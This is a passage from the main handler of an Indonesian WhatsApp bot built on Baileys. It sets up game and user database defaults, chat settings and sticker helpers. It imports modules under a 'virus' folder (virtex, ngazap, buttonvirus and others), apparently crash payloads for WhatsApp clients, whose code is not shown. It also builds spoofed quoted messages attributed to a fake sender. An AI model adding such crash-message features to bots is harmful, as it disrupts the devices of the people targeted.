process.on('uncaughtException', console.error)
require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const ms = require('ms')
const crypto = require('crypto')
const FormData = require("form-data");
const hx = require("hxz-api")
const fetch = require('node-fetch')
const _sewa = require("./lib/sewa");
const { ngazap } = require('./lib/virus/ngazap.js')
const { virtex } = require('./lib/virus/virtex')
const { virus } = require('./lib/virus/virus')
const { philips } = require('./lib/virus/philips')
const { santedpc } = require('./lib/virus/santedpc')
const { santedgc } = require('./lib/virus/santedgc')
const { buttonvirus } = require('./lib/virus/buttonvirus')
const { buttonvirus2 } = require('./lib/virus/buttonvirus2')
const { mediafire, aiovideodl } = require('./lib/scraper.js')
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const { addRespons, checkRespons, deleteRespons } = require('./lib/respon');
const { addCommands, checkCommands, deleteCommands } = require('./lib/autoresp');
const { isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance } = require('./lib/limit')
const { isGame, gameAdd, givegame, cekGLimit } = require('./lib/glimit');
const { jadibot, conns } = require('./jadibot')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)

//Other
const pp_bot = global.image
const limitCount = global.limitawal.free
const gcount = global.limitawal.glimit

//Web Apikey
const webdani = global.webapidani

//Apikey
const daniapi = global.daniapi
const violetics = global.violetics
const zekaisapi = global.zekaisapi

// read database
const tebaklagu = db.data.game.tebaklagu = []
const _family100 = db.data.game.family100 = []
const kuismath = db.data.game.math = []
const tebakgambar = db.data.game.tebakgambar = []
const tebakkata = db.data.game.tebakkata = []
const caklontong = db.data.game.caklontong = []
const tebakkalimat = db.data.game.tebakkalimat = []
const tebaklirik = db.data.game.tebaklirik = []
const tebaktebakan = db.data.game.tebaktebakan = []
const tebakkimia = db.data.game.tebakkimia = []
const asahotak = db.data.game.asahotak = []
const tebakbendera = db.data.game.tebakbendera = []
const susunkata = db.data.game.susunkata = []
const tekateki = db.data.game.tekateki = []
const tebakkabupaten = db.data.game.tebakkabupaten = []
const tebakanime = db.data.game.tebakanime = []
const tebakwaifu = db.data.game.tebakwaifu = []
const tebakaplikasi = db.data.game.tebakaplikasi = []
const tebakjenaka= db.data.game.tebakjenaka = []
const vote = db.data.others.vote = []
const _cmdUser = db.data.others.commanduser = []
const _cmd = db.data.others.command = []
const _level = db.data.others.level = []
const _leveling = db.data.others.leveling = []
const sewa = db.data.others.sewa = []
const nsfw = db.data.others.nsfw = []
const db_respon_list = db.data.others.respondblist = []
const responDB = db.data.others.respondb = []
const balance = db.data.others.belance = []
const limit = db.data.others.limit = []
const glimit = db.data.others.glimit = []
const ban = db.data.others.ban = []
const commandsDB = db.data.others.commandrespon = []

//Add File
const stiker = JSON.parse(fs.readFileSync('./storage/sticker.json'))
const audio = JSON.parse(fs.readFileSync('./storage/audio.json'))
const image = JSON.parse(fs.readFileSync('./storage/image.json'))
const video = JSON.parse(fs.readFileSync('./storage/video.json'))

//Data Text
const bad = JSON.parse(fs.readFileSync('./database/data/toxic.json'))

module.exports = Dani = async (Dani, m, chatUpdate, store) => {
try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = /^[°zZ#@+,.?=():√%!¢£¥€π¤ΠΦ&<™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#@+,.?=():√%¢£¥€π¤ΠΦ&<!™©®Δ^βα¦|/\\©^]/gi) : '.'
const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
const chats = (m.type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (m.type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (m.type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (m.type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (m.type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (m.type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (m.type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await Dani.decodeJid(Dani.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const owner = global.owner
const from = m.chat
const sender = m.sender
const senderr = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const tanggal = moment().format("ll")
const qtod = m.quoted? "true":"false"
const fatkuns = (m.quoted || m)
const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
const isSewa = _sewa.checkSewaGroup(from, sewa)
const groupMetadata = m.isGroup ? await Dani.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const groupMembers = m.isGroup ? groupMetadata.participants : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
const isNsfw = m.isGroup ? nsfw.includes(from) : false
const num = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? Dani.user.jid : m.sender
const isBan = ban.includes(m.sender)
const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
const content = JSON.stringify(m.message)
const isImage = (m.type === 'imageMessage')
const isVideo = (m.type === 'videoMessage')
const isMedias = (m.mtype === 'imageMessage' || m.mtype === 'videoMessage')
const isQuotedImage = m.mtype === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = m.mtype === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedAudio = m.mtype === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedSticker = m.mtype === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedLoca = m.mtype === 'extendedTextMessage' && content.includes('locationMessage')
const isQuotedContact = m.mtype === 'extendedTextMessage' && content.includes('contactMessage')
const isQuotedDocs = m.mtype === 'extendedTextMessage' && content.includes('documentMessage')
const isQuotedTeks = m.mtype === 'extendedTextMessage' && content.includes('quotedMessage')
const isQuotedTag = m.mtype === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedProd = m.mtype === 'extendedTextMessage' && content.includes('productMessage')
const isQuotedReply = m.mtype === 'extendedTextMessage' && content.includes('Message')
const mentionByTag = m.mtype == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = m.mtype == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false

//Sewa
_sewa.expiredCheck(Dani, sewa)

//Time
moment.tz.setDefault("Asia/Jakarta").locale("id");
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)	

// Check Bandwidth
let { sizeFormatter } = require("human-readable");
let formatd = sizeFormatter({
std: "JEDEC", // 'SI' (default) | 'IEC' | 'JEDEC'
decimalPlaces: 2,
keepTrailingZeroes: false,
render: (literal, symbol) => `${literal} ${symbol}B`,
});
async function checkBandwidth() {
var data = require("node-os-utils")
data = await data.netstat.stats()
let ind = 0
let out = 0
for (let i of data) {
ind = ind + i.inputBytes
out = out + i.outputBytes
}
return {
download: formatd(ind),
upload: formatd(out)
}
}

//Fake Reply
const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': pp_bot, thumbnail: pp_bot,sendEphemeral: true}}}
const freply = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16504228206@s.whatsapp.net' } : {}) }, message: { "contactMessage": { "displayName": `${pushname}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail":fs.readFileSync('./media/image/Dani.jpg')
}}}
const textImg = (teks) => {
return Dani.sendMessage(from, { text: teks, jpegThumbnail: pp_bot }, { quoted: freply })
}
const reply = (teks) => {
Dani.sendMessage(from, { text: teks, jpegThumbnail: pp_bot }, { quoted: m })
}

try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.healt)) user.healt = 0
if (!isNumber(user.level)) user.level = 1
if (!isNumber(user.exp)) user.exp = 0
if (!isNumber(user.lastseen)) user.lastseen = 0
if (!isNumber(user.lastclaim)) user.lastclaim = 0
if (!isNumber(user.lastclaim2)) user.lastclaim2 = 0  
if (!isNumber(user.lastngojek)) user.lastngojek = 0
if (!isNumber(user.lastnebang)) user.lastnebang = 0
if (!isNumber(user.lastnyampah)) user.lastnyampah = 0
if (!isNumber(user.lastowner)) user.lastowner = 0
if (!isNumber(user.money)) user.money = 0
if (!isNumber(user.diamond)) user.diamond = 0
if (!isNumber(user.ramuan)) user.ramuan = 0
if (!isNumber(user.iron)) user.iron = 0
if (!isNumber(user.batu)) user.batu = 0
if (!isNumber(user.kayu)) user.kayu = 0
if (!isNumber(user.string)) user.string = 0  
if (!isNumber(user.common)) user.common = 0
if (!isNumber(user.uncommon)) user.uncommon = 0
if (!isNumber(user.mythic)) user.mythic = 0
if (!isNumber(user.legendary)) user.legendary = 0
if (!isNumber(user.pet)) user.pet = 0
if (!isNumber(user.psepick)) user.psepick = 0
if (!isNumber(user.psenjata)) user.psenjata = 0                    
if (!isNumber(user.potion)) user.potion = 0
if (!isNumber(user.sampah)) user.sampah = 0
if (!isNumber(user.armor)) user.armor = 0
if (!isNumber(user.kucing)) user.kucing = 0
if (!isNumber(user.kucinglastclaim)) user.kucinglastclaim = 0
if (!isNumber(user.kuda)) user.kuda = 0
if (!isNumber(user.kudalastclaim)) user.kudalastclaim = 0
if (!isNumber(user.rubah)) user.rubah = 0
if (!isNumber(user.rubahlastclaim)) user.rubahlastclaim = 0
if (!isNumber(user.anjing)) user.anjing = 0
if (!isNumber(user.anjinglastclaim)) user.anjinglastclaim = 0
if (!isNumber(user.area)) user.area = 0
if (!('banned' in user)) user.banned = false
if (!isNumber(user.warn)) user.warn = 0
if (!isNumber(user.warning)) user.warning = 0
if (!isNumber(user.lastIstigfar)) user.lastIstigfar = 0
if (!isNumber(user.call)) user.call = 0  
//RPG
if (!isNumber(user.healthmonster)) user.healthmonster = 0
if (!isNumber(user.anakkucing)) user.anakkucing = 0
if (!isNumber(user.anakkuda)) user.anakkuda = 0
if (!isNumber(user.anakrubah)) user.anakrubah = 0
if (!isNumber(user.anakanjing)) user.anakanjing = 0
if (!isNumber(user.serigala)) user.serigala = 0
if (!isNumber(user.anakserigala)) user.anakserigala = 0
if (!isNumber(user.naga)) user.naga = 0
if (!isNumber(user.anaknaga)) user.anaknaga = 0
if (!isNumber(user.phonix)) user.phonix = 0
if (!isNumber(user.anakphonix)) user.anakphonix = 0
if (!isNumber(user.griffin)) user.griffin = 0
if (!isNumber(user.anakgriffin)) user.anakgriffin = 0
if (!isNumber(user.kyubi)) user.kyubi = 0
if (!isNumber(user.anakkyubi)) user.anakkyubi = 0
if (!isNumber(user.centaur)) user.centaur = 0
if (!isNumber(user.anakcentaur)) user.anakcentaur = 0
if (!isNumber(user.makananpet)) user.makananpet = 0
if (!isNumber(user.antispam)) user.antispam = 0
if (!isNumber(user.antispamlastclaim)) user.antispamlastclaim = 0
if (!isNumber(user.sword)) user.sword = 0
if (!isNumber(user.sworddurability)) user.sworddurability = 0
if (!isNumber(user.pickaxe)) user.pickaxe = 0
if (!isNumber(user.pickaxedurability)) user.pickaxedurability = 0
if (!isNumber(user.fishingrod)) user.fishingrod = 0
if (!isNumber(user.fishingroddurability)) user.fishingroddurability = 0
if (!isNumber(user.apel)) user.apel = 0
if (!isNumber(user.ayamb)) user.ayamb = 0
if (!isNumber(user.ayamg)) user.ayamg = 0
if (!isNumber(user.sapir)) user.sapir = 0
if (!isNumber(user.ssapi)) user.ssapi = 0
if (!isNumber(user.esteh)) user.esteh = 0
if (!isNumber(user.leleg)) user.leleg = 0
if (!isNumber(user.leleb)) user.leleb = 0
if (!isNumber(user.lastadventure)) user.lastadventure = 0
if (!isNumber(user.lastkill)) user.lastkill = 0
if (!isNumber(user.lastfishing)) user.lastfishing = 0
if (!isNumber(user.lastdungeon)) user.lastdungeon = 0
if (!isNumber(user.lastwar)) user.lastwar = 0
if (!isNumber(user.lastsda)) user.lastsda = 0
if (!isNumber(user.lastberbru)) user.lastberbru = 0
if (!isNumber(user.lastduel)) user.lastduel = 0
if (!isNumber(user.lastjb)) user.lastjb = 0
if (!isNumber(user.lastSetStatus)) user.lastSetStatus = 0
if (!isNumber(user.lastmining)) user.lastmining = 0
if (!isNumber(user.lasthunt)) user.lasthunt = 0
if (!isNumber(user.lastngocok)) user.lastngocok = 0
if (!isNumber(user.lastgift)) user.lastgift = 0
if (!isNumber(user.lastrob)) user.lastrob = 0
if (!isNumber(user.lastngojek)) user.lastngojek = 0
if (!isNumber(user.lastgrab)) user.lastgrab = 0
if (!isNumber(user.lastmerampok)) user.lastmerampok = 0                    
if (!isNumber(user.lastberkebon)) user.lastberkebon = 0
if (!isNumber(user.lastcodereg)) user.lastcodereg = 0
if (!isNumber(user.lastdagang)) user.lastdagang = 0
if (!isNumber(user.lasthourly)) user.lasthourly = 0
if (!isNumber(user.lastweekly)) user.lastweekly = 0
if (!isNumber(user.lastmonthly)) user.lastmonthly = 0
if (!isNumber(user.lastIstigfar)) user.lastIstigfar = 0
if (!isNumber(user.lastturu)) user.lastturu = 0
if (!isNumber(user.lastseen)) user.lastseen = 0
if (!isNumber(user.lastbansos)) user.lastbansos = 0
if (!isNumber(user.lastrampok)) user.lastrampok = 0
if (!('registered' in user)) user.registered = false
if (!user.registered) {
if (!('name' in user)) user.name = Dani.getName(m.sender)
if (!('email' in user)) user.email = ''
if (!('label' in user)) user.label = ''
if (!isNumber(user.age)) user.age = -1
if (!isNumber(user.regTime)) user.regTime = -1
}
if (!isNumber(user.apel)) user.apel = 0
if (!isNumber(user.anggur)) user.anggur = 0
if (!isNumber(user.jeruk)) user.jeruk = 0
if (!isNumber(user.semangka)) user.semangka = 0
if (!isNumber(user.mangga)) user.mangga = 0
if (!isNumber(user.stroberi)) user.stroberi = 0
if (!isNumber(user.pisang)) user.pisang = 0
if (!isNumber(user.kayu)) user.kayu = 0
if (!isNumber(user.botol)) user.botol = 0
if (!isNumber(user.kardus)) user.kardus = 0
if (!isNumber(user.kaleng)) user.kaleng = 0
if (!isNumber(user.aqua)) user.aqua = 0
if (!isNumber(user.diamond)) user.diamond = 0
if (!isNumber(user.iron)) user.iron = 0
if (!isNumber(user.emas)) user.emas = 0
if (!isNumber(user.arlok)) user.arlok = 0
if (!isNumber(user.makanan)) user.makanan = 0
if (!isNumber(user.bibitanggur)) user.bibitanggur = 0
if (!isNumber(user.bibitpisang)) user.bibitpisang = 0
if (!isNumber(user.bibitapel)) user.bibitapel = 0
if (!isNumber(user.bibitmangga)) user.bibitmangga = 0
if (!isNumber(user.bibitjeruk)) user.bibitjeruk = 0

if (!('premium' in user)) user.premium = false
if (!isNumber(user.premiumTime)) user.premiumTime = 0
if (!user.role) user.role = ''
if (!('autolevelup' in user)) user.autolevelup = false
if (!isNumber(user.pc)) user.pc = 0
//mancing
if (!isNumber(user.as)) user.as = 0
if (!isNumber(user.paus)) user.paus = 0
if (!isNumber(user.kepiting)) user.kepiting = 0
if (!isNumber(user.gurita)) user.gurita = 0
if (!isNumber(user.cumi)) user.cumi= 0
if (!isNumber(user.buntal)) user.buntal = 0
if (!isNumber(user.dory)) user.dory = 0
if (!isNumber(user.lumba)) user.lumba = 0
if (!isNumber(user.lobster)) user.lobster = 0
if (!isNumber(user.hiu)) user.hiu = 0
if (!isNumber(user.udang)) user.udang = 0
if (!isNumber(user.ikan)) user.ikan = 0
if (!isNumber(user.orca)) user.orca = 0
// kerja
if (!isNumber(user.atm)) user.atm = 0
if (!('job' in user)) user.job = 'Pengangguran'
if (!isNumber(user.lastjob)) user.lastjob = 0
if (!isNumber(user.lastkerja)) user.lastkerja = 0
if (!('ojek' in user)) user.ojek = false
if (!('pedagang' in user)) user.pedagang = false
if (!('dokter' in user)) user.dokter = false
if (!('petani' in user)) user.petani = false
if (!('montir' in user)) user.montir = false
if (!('kuli' in user)) user.kuli = false
if (!('polisi' in user)) user.polisi = false                           
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
healt: 100,
level: 1,
exp: 0,
lastclaim: 0,
lastclaim2: 0,
lastngojek: 0,
lastnebang: 0,
lastnyampah: 0,
lastowner: 0,
money: 0,
diamond: 0,
iron: 0,
common: 0,
uncommon: 0,
mythic: 0,
legendary: 0,
pet: 0,
potion: 0,
sampah: 0,
armor: 0,
kucing: 0,
kucinglastclaim: 0,
kuda: 0,
kudalastclaim: 0,
rubah: 0,
rubahlastclaim: 0,
anjing: 0,
anjinglastclaim: 0,
naga: 0,
nagalastclaim: 0,
griffin: 0,
griffinlastclaim: 0,
centaur: 0,
centaurlastclaim: 0,
serigala: 0,
serigalalastclaim: 0,
phonix: 0,
phonixlastclaim: 0,
makanannaga: 0,
makananphonix: 0,
makanancentaur: 0,
makananserigala: 0,
area: 0,
banned: false,
warn: 0,
warning: 0,
lastIstigfar: 0,
call: 0,
afk: -1,
afkReason: '',
pasangan: '',
anakkucing: 0,
anakkuda: 0,
anakrubah: 0,
anakanjing: 0,
makananpet: 0,
antispam: 0,
antispamlastclaim: 0,
kayu: 0,
batu: 0,
string: 0,
sword: 0,
sworddurability: 0,
pickaxe: 0,
pickaxedurability: 0,
fishingrod: 0,
fishingroddurability: 0,
lastadventure: 0,
lastdungeon: 0,
lastduel: 0,
lastmining: 0,
lasthourly: 0,
lasthunt: 0,
lastweekly: 0,
lastmonthly: 0,
lastjb: 0,
lastrob: 0,
lastdaang: 0,
lastngojek: 0,
lastgrab: 0,
lastmerampok: 0,                    
lastngocok: 0,
lastturu: 0,
lastseen: 0,
lastSetStatus: 0,
registered: false,
apel: 20,
mangga: 20,
stroberi: 20,
semangka: 20,
jeruk: 20,
semangka: 20,                    
name: Dani.getName(m.sender),
email: '',
label: '',
age: -1,
regTime: -1,
regTime: -1,
premium: false,
premiumTime: 0,
role: '',
autolevelup: false,
pc: 0,
// Mancing cuk
 as: 0,
paus: 0,
kepiting: 0,
gurita: 0,
cumi: 0,
buntal: 0,
dory: 0,
lumba: 0,
lobster: 0,
hiu: 0,
lele: 0,
nila: 0,
bawal: 0,
udang: 0,
ikan: 0,
orca: 0,
banteng: 0,
harimau: 0,
gajah: 0,
kambing: 0,
panda: 0,
buaya: 0,
kerbau : 0,
sapi: 0,
monyet : 0,
babihutan: 0,
babi: 0,
ayam: 0,
apel: 20,
ayamb: 0,
ayamg: 0,
ssapi: 0,
sapir: 0,
leleb: 0,
leleg: 0,
esteh: 0,
// Kerja Woy
atm: 0,
job: 'Pengangguran',
lastjob: 0,
lastkerja: 0,
ojek: false,
pedagang: false,
dokter: false,
petani: false,
montir: false,
kuli: false,
polisi: false,
afkTime: -1,
afkReason: '',
limit: limitUser,
}

let chats = global.db.data.chats[m.chat]
if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
if (chats) {
if (!('mute' in chats)) chats.mute = false
if (!('antilink' in chats)) chats.antilink = false              
if (!('antilink2' in chats)) chats.antilink2 = false        
if (!('antilink3' in chats)) chats.antilink3 = false
if (!('antilink4' in chats)) chats.antilink4 = false
if (!('antivirtex' in chats)) chats.antivirtex = false
if (!('antivirtex2' in chats)) chats.antivirtex2 = false
if (!('antivirtex3' in chats)) chats.antivirtex3 = false
if (!('antivirtex4' in chats)) chats.antivirtex4 = false
if (!('antivirtex5' in chats)) chats.antivirtex5 = false
if (!('antiwame' in chats)) chats.antiwame = false                
if (!('antionce' in chats)) chats.antionce = true
if (!('autosticker' in chats)) chats.autosticker = false
if (!('antihidetag' in chats)) chats.antihidetag = false
if (!('autoblock' in chats)) chats.autoblock = false
if (!('antitoxic' in chats)) chats.antitoxic = false
if (!('antibule' in chats)) chats.antibule = false
if (!('antivn' in chats)) chats.antivn = false
if (!('antiphoto' in chats)) chats.antiphoto = false
if (!('antisticker' in chats)) chats.antisticker = false
if (!('antivideo' in chats)) chats.antivideo = false
if (!('leveling' in chats)) chats.leveling = false
if (!('autorespon' in chats)) chats.autorespon = false
} else global.db.data.chats[m.chat] = {
mute: false,
antilink: false,
antilink2: false,
antilink3: false,
antilink4: false,
antivirtex: false,
antivirtex2: false,
antivirtex3: false,
antivirtex4: false,
antivirtex5: false,
antiwame: false,           
antionce: true,           
autosticker: false,           
antihidetag: false,           
autoblock: false,           
antitoxic: false,           
antibule: false,
antisticker: false,
antiphoto: false,
antivn: false,
antivideo: false,
leveling: false,
autorespon: false,
}

let setting = db.data.settings[botNumber]
if (typeof setting !== 'object') db.data.settings[botNumber] = {}
if (setting) {
if (!('anticall' in setting)) setting.anticall = true
if (!isNumber(setting.status)) setting.status = 0
if (!('autobio' in setting)) setting.autobio = true
if (!('templateImage' in setting)) setting.templateImage = true
if (!('templateVideo' in setting)) setting.templateVideo = false
if (!('templateGif' in setting)) setting.templateGif = false
if (!('templateMsg' in setting)) setting.templateMsg = false
if (!('templateLocation' in setting)) setting.templateLocation = false
} else global.db.data.settings[botNumber] = {
anticall: true,
status: 0,
autobio: true,
templateImage: true,
templateVideo: false,
templateGif: false,
templateMsg: false,
templateLocation: false,
}

} catch (err) {
console.error(err)
}

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

// Public & Self
if (!Dani.public) {
if (!m.key.fromMe) return
}

// Push Message To Console && Auto Read
if (m.message) {
Dani.readMessages([m.key])
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
}

//auto recording all
if (global.autoRecord) { if (m.chat) { Dani.sendPresenceUpdate('recording', m.chat) }
}
//autotyper all
if (global.autoTyping) { if (m.chat) { Dani.sendPresenceUpdate('composing', m.chat) }
}

if (isCmd && !isCreator) antiSpam.addFilter(from)

function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
wm = 'Xsec7 Assist By Dani'
 //GLOBAL
flaminge = pickRandom([
'https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=water-logo&script=water-logo&fontsize=90&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextColor=%23000&shadowGlowColor=%23000&backgroundColor=%23000&text=',
'https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=crafts-logo&fontsize=90&doScale=true&scaleWidth=800&scaleHeight=500&text=',
'https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=amped-logo&doScale=true&scaleWidth=800&scaleHeight=500&text=',
'https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=',
'https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&fillColor1Color=%23f2aa4c&fillColor2Color=%23f2aa4c&fillColor3Color=%23f2aa4c&fillColor4Color=%23f2aa4c&fillColor5Color=%23f2aa4c&fillColor6Color=%23f2aa4c&fillColor7Color=%23f2aa4c&fillColor8Color=%23f2aa4c&fillColor9Color=%23f2aa4c&fillColor10Color=%23f2aa4c&fillOutlineColor=%23f2aa4c&fillOutline2Color=%23f2aa4c&backgroundColor=%23101820&text='
])

// reset limit every 12 hours
let cron = require('node-cron')
cron.schedule('00 12 * * *', () => {
let user = Object.keys(global.db.data.users)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
for (let jid of user) global.db.data.users[jid].limit = limitUser
console.log('Reseted Limit')
}, {
scheduled: true,
timezone: "Asia/Jakarta"
})

// auto set bio
if (db.data.settings[botNumber].autobio) {
let setting = global.db.data.settings[botNumber]
if (new Date() * 1 - setting.status > 1000) {
let uptime = await runtime(process.uptime())
await Dani.setStatus(`Dani Assist | Runtime : ${runtime(process.uptime())}`)
setting.status = new Date() * 1
}
}

//Sticker Masenge
const sticWait = (hehe) => {
ano = fs.readFileSync('./media/sticker/wait.webp')
Dani.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
const sticOwner = (hehe) => {
ano = fs.readFileSync('./media/sticker/owner.webp')
Dani.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
const sticNotAdmin = (hehe) => {
ano = fs.readFileSync('./media/sticker/notadmin.webp')
Dani.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
const sticAdmin = (hehe) => {
ano = fs.readFileSync('./media/sticker/admin.webp')
Dani.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
const sticOk = (hehe) => {
ano = fs.readFileSync('./media/sticker/ok.webp')
Dani.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
const sticGroup = (hehe) => {
ano = fs.readFileSync('./media/sticker/group.webp')
